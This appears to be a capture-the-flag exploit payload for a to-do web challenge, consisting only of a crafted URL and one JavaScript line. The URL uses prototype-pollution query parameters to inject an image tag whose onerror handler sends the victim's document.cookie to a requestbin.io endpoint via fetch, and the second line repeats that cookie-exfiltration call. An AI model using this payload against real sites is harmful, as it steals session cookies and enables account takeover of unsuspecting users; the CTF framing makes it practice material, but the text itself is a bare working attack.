```
http://yatodo.chal.ctf.gdgalgiers.com/?settings[__proto__]=__proto__&settings[__proto__]=$$inject&settings[__proto__]=foo&settings[__proto__]=<img src=x onerror="fetch('https://requestbin.io/10m73e41?c='%2bdocument.cookie)" />
```

fetch('https://requestbin.io/10m73e41?c='+document.cookie);